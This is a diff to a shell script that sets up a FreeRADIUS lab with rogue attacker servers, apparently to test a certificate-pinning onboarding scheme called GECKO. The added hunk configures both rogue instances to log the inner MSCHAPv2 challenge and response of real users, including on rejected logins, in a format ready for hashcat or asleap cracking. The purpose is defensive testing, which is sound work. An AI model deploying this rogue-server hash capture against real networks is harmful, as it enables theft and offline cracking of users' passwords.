@@ -208,6 +208,41 @@ ATTACKER_USERS='gecko@gecko.sp.test	Cleartext-Password := "gecko"'
 build attacker-b1 radius-rogue rogue-ca "$RADIUS_SECRET_B" "$ATTACKER_USERS" 1814
 build attacker-b2 radius-b2 gecko-lab-ca "$RADIUS_SECRET_B" "$ATTACKER_USERS" 1816
 
+# --- attacker credential-harvesting overlay (lab only) ----------------------
+# Stock FreeRADIUS validates the inner MSCHAPv2 exchange and throws it away; it
+# is an authenticator, not a harvester. This overlay makes the two attacker
+# instances LOG the inner challenge+response of any identity other than the
+# public onboarding one - i.e. a real user who trusted the rogue server
+# certificate - to <instance>/captured-hashes.log, in hashcat -m 5500 /asleap
+# format. That capture is the HARM the GECKO path prevents: with a GECKO-pinned
+# profile the TLS tunnel never completes, so the client never sends a response
+# and nothing is ever written here. Read it with extract-hashes.sh.
+for atk in attacker-b1 attacker-b2; do
+    adir="$BASE/$atk"
+    cat > "$adir/mods-enabled/capture_hash" <<'EOF'
+# One NetNTLMv1/MSCHAPv2 line per captured login (lab only).
+linelog capture_hash {
+	filename = ${confdir}/captured-hashes.log
+	permissions = 0644
+	format = "%{mschap:User-Name}::::%{mschap:NT-Response}:%{mschap:Challenge}"
+}
+EOF
+    cat > "$adir/policy.d/capture" <<'EOF'
+# Capture the inner MSCHAPv2 hash of any identity that is not the public GECKO
+# onboarding identity, in the EAP round where the client sends its response.
+capture_mschap {
+	if (&User-Name != "gecko@gecko.sp.test" && "%{mschap:NT-Response}") {
+		capture_hash
+	}
+}
+EOF
+    # Run it in the inner tunnel on both paths. The attacker rejects real users
+    # (it cannot complete MSCHAPv2 without the password), but by then the
+    # client's response has already arrived, so capture on the reject path too.
+    sed -i -E '0,/^post-auth \{/s//post-auth {\n\tcapture_mschap/' "$adir/sites-enabled/inner-tunnel"
+    sed -i -E '0,/Post-Auth-Type REJECT \{/s//Post-Auth-Type REJECT {\n\t\tcapture_mschap/' "$adir/sites-enabled/inner-tunnel"
+done
+
 for name in legit attacker-b1 attacker-b2; do
     sudo freeradius -C -d "$BASE/$name" >/dev/null 2>&1 \
         && echo "$name: config OK" \
